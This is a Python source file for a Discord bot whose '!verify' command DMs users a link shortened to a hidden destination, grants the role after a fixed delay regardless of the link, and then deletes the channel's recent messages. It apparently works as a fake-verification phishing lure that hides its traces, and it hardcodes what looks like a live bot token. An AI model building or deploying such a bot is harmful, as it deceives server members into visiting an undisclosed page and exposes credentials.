import discord
from discord.ext import commands
import asyncio

TOKEN = "MTM0MTA2NTc2NzA0MjQyMDc4Nw.GYAY6v.-6-pS06Kzj3Lghv2ZEVYV7MOCQemrYb3VfuXxQ"
GUILD_ID = 1341062292002967552
VERIFY_ROLE_ID = 1341189416407928932 
CUSTOM_VERIFICATION_URL = "https://shorturl.at/UHQTB"

intents = discord.Intents.default()
intents.members = True  # Enable privileged members intent
intents.message_content = True  # Enable message content intent

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def verify(ctx):
    user_id = ctx.author.id

    # Delete the user's original message to make it disappear
    await ctx.message.delete()

    # Send the custom verification link via DM (Direct Message)
    verification_link = f"{CUSTOM_VERIFICATION_URL}"
    await ctx.author.send(f"Click this link to verify: {verification_link}")

    # Send a confirmation message in the channel (no ping, just a dismissable message)
    confirmation_message = await ctx.send("A verification link has been sent to your DMs. Please check your messages.")

    # Wait for 3 seconds before deleting the confirmation message (making it disappear)
    await asyncio.sleep(3)
    await confirmation_message.delete()

    # Wait for 10 seconds before assigning the role
    await asyncio.sleep(10)

    # After 10 seconds, assign the role
    await assign_role(ctx, user_id)

    # After assigning the role, send a "Successfully verified" message for 5 seconds
    success_message = await ctx.send("Successfully verified!")
    await asyncio.sleep(5)
    await success_message.delete()

    # Delete all messages in the channel after 15 seconds
    await asyncio.sleep(15)
    await delete_all_messages(ctx)

async def assign_role(ctx, user_id):
    # Ensure the guild is correctly found
    guild = ctx.guild  # Get the guild where the command was called
    if guild:
        # Find the member by user ID
        member = guild.get_member(user_id)
        if member:
            # Find the role by ID
            role = guild.get_role(VERIFY_ROLE_ID)
            if role:
                # Assign the role to the member
                await member.add_roles(role)
                print(f"Assigned role to {member.name}")
            else:
                print(f"Role not found: {VERIFY_ROLE_ID}")
        else:
            print(f"Member not found: {user_id}")
    else:
        print("Guild not found")

async def delete_all_messages(ctx):
    # Delete all messages in the channel
    channel = ctx.channel
    async for message in channel.history(limit=100):  # Adjust the limit as needed
        await message.delete()

bot.run(TOKEN)
